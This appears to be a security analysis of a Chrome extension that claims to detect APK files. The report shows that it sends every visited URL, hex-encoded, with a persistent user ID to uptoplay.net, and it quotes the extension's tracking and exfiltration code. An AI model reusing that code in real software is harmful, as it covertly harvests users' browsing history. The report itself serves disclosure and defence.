# Vulnerability Report: ApkOnline APK manager for Android emulator

## Metadata
- **Extension ID**: lnhnebkkgjmlgomfkkmkoaefbknopmja
- **Extension Name**: ApkOnline APK manager for Android emulator
- **Version**: 1.8.8
- **Users**: ~300,000
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

This extension claims to manage APK files for the ApkOnline Android emulator platform. However, it implements comprehensive browsing history tracking that sends every URL visited by the user to uptoplay.net servers. While the extension popup does include a notice stating "This extension collects your browsed URLs in our servers in order to detect APK and other files," this disclosure is inadequate given the scope of tracking. The extension monitors all tab activations and updates, transmitting complete URLs (excluding only uptoplay.net itself) to a remote server along with a persistent user identifier. This constitutes undisclosed mass surveillance of user browsing activity under the guise of APK detection.

The extension has 300,000 users and a concerning 2.9 rating, suggesting user dissatisfaction. The data collection far exceeds what would be necessary for legitimate APK file detection.

## Vulnerability Details

### 1. HIGH: Comprehensive Browsing History Exfiltration

**Severity**: HIGH
**Files**: w.js, apar.js
**CWE**: CWE-359 (Exposure of Private Information)
**Description**: The extension tracks every URL visited by the user across all tabs and sends this data to uptoplay.net servers. The tracking mechanism activates on both tab activation and tab updates, ensuring comprehensive coverage of browsing activity.

**Evidence**:
```javascript
// w.js lines 22-31
chrome.tabs.onActivated.addListener(function(activeInfo) {
    activeTabId = activeInfo.tabId;
    gti(activeTabId);
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    gti(tabId);
});

// w.js lines 4-14
function gti(tabId) {
    chrome.tabs.get(tabId, function(tab) {
        if ( ( tab.url.indexOf("uptoplay") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
            urlx =  tab.url;
            reporturlscannedandrecorded = urlx;
            extractf(reporturlscannedandrecorded , tabId );
            lastUrl = tab.url;
        }
    });
}

// w.js line 90 - Data exfiltration
let rvbgt = await fetch('https://www.uptoplay.net/media/system/ext/c-2-androidemulator-x-y-2.php?url=' + b2x(urlxx) + '&hex=' + tid + '&u=' + un);
```

The `b2x()` function converts the URL to hexadecimal encoding before transmission, which appears to be an attempt to obscure the data being sent.

**Verdict**: This is HIGH severity because while there is a disclosure in the popup UI, it is insufficient for the scope of tracking. The extension monitors every single page the user visits and transmits this to a third party. The stated purpose (detecting APK files) does not justify blanket URL tracking.

### 2. HIGH: Persistent User Tracking with Server-Side Profile

**Severity**: HIGH
**Files**: w.js, apar.js
**CWE**: CWE-359 (Exposure of Private Information)
**Description**: The extension creates a persistent random user identifier that is stored in chrome.storage and sent with every URL transmission. This allows the server to build comprehensive browsing profiles tied to individual users over time.

**Evidence**:
```javascript
// w.js lines 67-83
async function extractf(urlxx, tid ) {
    var opcA = { usercx: null,  apkononline: null };
    var usercx = "";
    const apkon_key = "apkon_key";

    let storres = await chrome.storage.local.get([apkon_key]);
    if (apkon_key in storres) { opcA = storres[apkon_key] }

    if ( opcA.usercx ) { usercx = opcA.usercx; }
    else { usercx = "" + ranSX(10) + "".toLowerCase();  opcA.usercx = usercx; }

    var un = usercx;
    // ... URL sent with user identifier: &u=' + un
}

// apar.js lines 45-65 - Server retrieves user's browsing history
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://www.uptoplay.net/media/system/ext/c-2-androidemulatorr.php?u=' + username, true);
xhr1.onload = function (e) {
    if (xhr1.readyState === 4) {
        if (xhr1.status === 200) {
            var response1 = xhr1.responseText;
            listfilesx.innerHTML = response1;
        }
    }
};
```

**Verdict**: The extension creates a permanent tracking identifier and uses it to associate all browsing activity with a single user profile. The server can then retrieve this history (as shown in apar.js). This enables long-term surveillance and profiling.

## False Positives Analysis

**Legitimate APK Detection**: A legitimate APK detection extension would only need to:
- Scan for specific file extensions (.apk) in page content or download events
- Check MIME types of downloads
- Possibly scan specific domains known to host APK files

The current implementation goes far beyond this by:
- Tracking ALL URLs visited, not just those containing APK files
- Sending complete URLs to a server rather than processing locally
- Creating persistent user identifiers for tracking
- Maintaining server-side browsing history profiles

**Checkbox Control**: The extension does include a checkbox to disable detection (lines 72-88 in apar.js), which sets `apkononline` to "0" or "1" in storage. However, this is inadequate mitigation for the privacy concerns, as most users will not understand the extent of tracking or know to disable it.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| www.uptoplay.net/media/system/ext/c-2-androidemulator-x-y-2.php | URL tracking | Visited URL (hex-encoded), tab ID, user identifier | HIGH - Enables comprehensive browsing history collection |
| www.uptoplay.net/media/system/ext/c-2-androidemulatorr.php | Retrieve user history | User identifier | HIGH - Server retrieves and displays tracked URLs back to extension |
| www.uptoplay.net/media/system/ext/intro-android-emulator.php | Redirect (conditional) | Visited URL (hex-encoded), user identifier | MEDIUM - Appears to redirect user based on server response |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**: This extension implements comprehensive browsing surveillance under the guise of APK file detection. Every URL visited by 300,000 users is transmitted to uptoplay.net servers along with a persistent user identifier, enabling the creation of detailed browsing profiles. While there is a brief disclosure in the popup UI, it does not adequately communicate the scope of tracking or the privacy implications.

The extension's functionality far exceeds what would be necessary for legitimate APK detection. A proper implementation would scan for APK files locally or check specific download events, not track every single URL visited across all browsing sessions.

Key concerns:
1. Blanket URL tracking of all user browsing activity
2. Persistent user identifiers enabling long-term profiling
3. Server-side storage and retrieval of browsing history
4. Inadequate disclosure relative to the scope of tracking
5. Poor user rating (2.9) suggesting widespread dissatisfaction
6. Large user base (300,000) amplifies privacy impact

The extension is classified as HIGH rather than CRITICAL because there is some disclosure (albeit inadequate), the tracking can be disabled via checkbox, and there's no evidence of credential theft or more severe malicious activity. However, the privacy violation is significant and affects a large user base.
